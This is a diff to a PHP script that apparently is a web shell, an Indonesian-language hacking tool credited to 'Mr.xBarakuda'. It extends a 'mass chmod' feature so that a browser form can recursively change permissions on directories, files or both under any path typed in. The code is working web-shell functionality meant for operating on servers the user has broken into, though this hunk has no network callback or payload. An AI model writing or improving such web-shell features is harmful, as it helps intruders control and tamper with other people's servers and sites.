@@ -1001,7 +1001,7 @@ if (!isset($_POST['code'])) {
   /*
   Chmod Mass File and Folder
   Code by Mr.xBarakuda
-  v1.2 - Fixed CWD input
+  v1.3 - Fixed CWD input & pilih target chmod
   */
   $dosPerm = "0";
   $ficPerm = "0";
@@ -1040,21 +1040,35 @@ if (!isset($_POST['code'])) {
   $ficPerm = "0" . $f1 . $f2 . $f3;
   $ficPerm = octdec($ficPerm);
 
+  // Tentukan target chmod
+  $chmod_target = isset($_POST["chmod_target"]) ? $_POST["chmod_target"] : 'both';
+
   print "<center><h3>CHMOD Mass File and Folder by Mr.xBarakuda</h3>";
   print "<table><tr><td>";
   print "<form method='post'>";
+
   print "<tr><td>Hak Folder: </td>";
   print "<td><select name='dir1'><option value='5'>5</option><option value='7' selected>7</option></select><select name='dir2'><option value='0'>0</option><option value='5' selected>5</option><option value='7'>7</option></select><select name='dir3'><option value='0'>0</option><option value='5' selected>5</option><option value='7'>7</option></select></td></tr>";
+
   print "<tr><td>Hak File: </td>";
   print "<td><select name='fic1'><option value='4'>4</option><option value='6' selected>6</option></select><select name='fic2'><option value='0'>0</option><option value='4' selected>4</option><option value='6'>6</option></select><select name='fic3'><option value='0'>0</option><option value='4' selected>4</option><option value='6'>6</option></select></td></tr>";
+
+  print "<tr><td>Target: </td>";
+  print "<td><select name='chmod_target'>";
+  print "<option value='dir' " . ($chmod_target == 'dir' ? 'selected' : '') . ">Directory Only</option>";
+  print "<option value='file' " . ($chmod_target == 'file' ? 'selected' : '') . ">File Only</option>";
+  print "<option value='both' " . ($chmod_target == 'both' ? 'selected' : '') . ">Directory & File</option>";
+  print "</select></td></tr>";
+
   print "<tr><td>CWD =></td>";
   print "<td><input type='text' name='chemin' maxlength='200' size='50' value='" . htmlspecialchars(getcwd()) . "'></td></tr>";
+
   print "<tr><td> </td><td><input type='submit' value='Change Permissions!'></td></tr>";
   print "</form></td></tr></table></center>";
 
   if (($dosPerm || $ficPerm) > 0) {
 
-    function rChmod($chem, $dosPerm, $ficPerm) {
+    function rChmod($chem, $dosPerm, $ficPerm, $target) {
       global $retval;
       echo "<p><b>Result:</b></p>\r\n";
 
@@ -1068,13 +1082,29 @@ if (!isset($_POST['code'])) {
       foreach (new RecursiveIteratorIterator($d, 1) as $path) {
         $chmodret = false;
         $chmodresultat = "";
+
         if ($path->isDir()) {
-          $chmodret = chmod($path, $dosPerm);
+          // Chmod directory
+          if ($target == 'dir' || $target == 'both') {
+            $chmodret = chmod($path, $dosPerm);
+          } else {
+            $chmodresultat = "<font color=gray>[~] SKIP [+] (folder)</font>";
+            echo $chmodresultat . " " . htmlspecialchars($path) . "<br>\r\n";
+            continue;
+          }
         } else {
-          if (is_file($path)) {
-            $chmodret = chmod($path, $ficPerm);
+          // Chmod file
+          if ($target == 'file' || $target == 'both') {
+            if (is_file($path)) {
+              $chmodret = chmod($path, $ficPerm);
+            }
+          } else {
+            $chmodresultat = "<font color=gray>[~] SKIP [+] (file)</font>";
+            echo $chmodresultat . " " . htmlspecialchars($path) . "<br>\r\n";
+            continue;
           }
         }
+
         if ($chmodret) {
           $chmodresultat = "<font color=lime>[+] SUKSES [+]</font>";
         } else {
@@ -1086,15 +1116,16 @@ if (!isset($_POST['code'])) {
       return $retval;
     }
 
-    $nbfailed = rChmod($chem, $dosPerm, $ficPerm);
+    $nbfailed = rChmod($chem, $dosPerm, $ficPerm, $chmod_target);
     echo "<p><b>";
     if ($nbfailed > 0) {
-      echo $nbfailed . "<font color=red>CHMOD error, liat kesalahan diatas</font>";
+      echo $nbfailed . " <font color=red>CHMOD error, liat kesalahan diatas</font>";
     }
-    else echo "<font color=lime>DONE gan :v</font>";
+    else {
+      echo "<font color=lime>DONE</font>";
+    }
     echo "</b></p>\r\n";
   }
-  print "</body></html>";
 } elseif ($_GET['do'] == 'base64pict') {
   /*
   ** Convert Gambar ke Base64
